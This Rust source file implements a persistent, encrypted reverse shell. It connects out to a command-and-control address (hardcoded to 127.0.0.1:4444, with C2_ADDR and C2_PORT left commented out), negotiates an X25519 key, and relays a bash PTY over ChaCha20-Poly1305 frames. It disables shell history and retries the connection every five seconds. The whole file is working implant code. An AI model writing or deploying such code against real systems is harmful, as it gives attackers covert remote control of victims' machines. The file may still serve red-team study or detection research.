use futures::{SinkExt, StreamExt};
use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
use std::io::{Read, Write}; // Standard sync IO traits for the PTY
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt}, // We use raw Read/Write, not BufRead/Line
    net::TcpStream as TokioTcpStream,
};
use tokio_util::codec::{FramedRead, FramedWrite};

use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
use rand_core::OsRng;
use x25519_dalek::{EphemeralSecret, PublicKey};

mod codec;
use codec::EncryptedCodec;

#[tokio::main]
async fn main() {
    loop {
        match reverse_shell().await {
            Ok(_) => println!("[*] Goodbye."),
            Err(e) => eprintln!("[!] Connection error: {}. Retrying in 5 seconds...", e),
        }

        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    }
}

async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
    //const C2_ADDR: &str = env!("C2_ADDR");
    //const C2_PORT: &str = env!("C2_PORT");

    let mut stream = TokioTcpStream::connect("127.0.0.1:4444").await?;

    let my_secret = EphemeralSecret::random_from_rng(OsRng);
    let my_public = PublicKey::from(&my_secret);
    stream.write_all(my_public.as_bytes()).await?;
    let mut server_pub_bytes = [0u8; 32];
    stream.read_exact(&mut server_pub_bytes).await?;
    let server_public = PublicKey::from(server_pub_bytes);
    let shared_secret = my_secret.diffie_hellman(&server_public);

    let key = shared_secret.as_bytes();
    let cipher_tx = ChaCha20Poly1305::new_from_slice(key).unwrap();
    let cipher_rx = ChaCha20Poly1305::new_from_slice(key).unwrap();

    let (tcp_reader, tcp_writer) = tokio::io::split(stream);
    let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
    let mut frame_writer = FramedWrite::new(tcp_writer, EncryptedCodec::new(cipher_tx));

    let pty_system = NativePtySystem::default();
    // TODO: For this, we would need a custom signaling protocol - we might look at this later
    let pty_pair = pty_system
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
        .expect("Failed to create PTY");

    let mut _cmd = CommandBuilder::new("/bin/bash");
    _cmd.env("TERM", "xterm-256color");
    _cmd.env("PS1", "[V] \\u@\\h:\\w\\$ ");
    _cmd.env("HISTFILESIZE", "0");
    let _bash = pty_pair
        .slave
        .spawn_command(_cmd)
        .expect("Failed to spawn shell");

    let mut pty_reader = pty_pair.master.try_clone_reader()?;
    let mut pty_writer = pty_pair.master.take_writer()?;
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);

    tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 4096];
        loop {
            match pty_reader.read(&mut buf) {
                Ok(n) if n > 0 => {
                    let _ = tx.blocking_send(buf[..n].to_vec());
                }
                _ => break,
            }
        }
    });

    loop {
        tokio::select! {
            // Case 1: Network Packet Received (Already Decrypted by Codec)
            // frame_reader.next() yields Option<Result<Vec<u8>>>
            Some(result) = frame_reader.next() => {
                match result {
                    Ok(data) => {
                        // Write decrypted data to PTY
                        pty_writer.write_all(&data)?;
                        pty_writer.flush()?;
                    }
                    Err(e) => {
                        eprintln!("[!] Network Error (Integrity/IO): {}", e);
                        break;
                    }
                }
            }

            // Case 2: PTY Data Received (From Blocking Thread)
            Some(data) = rx.recv() => {
                // frame_writer.send() Encrypts + Frames the data automatically
                if let Err(e) = frame_writer.send(data).await {
                    eprintln!("[!] Failed to send packet: {}", e);
                    break;
                }
            }
        }
    }

    Ok(())
}
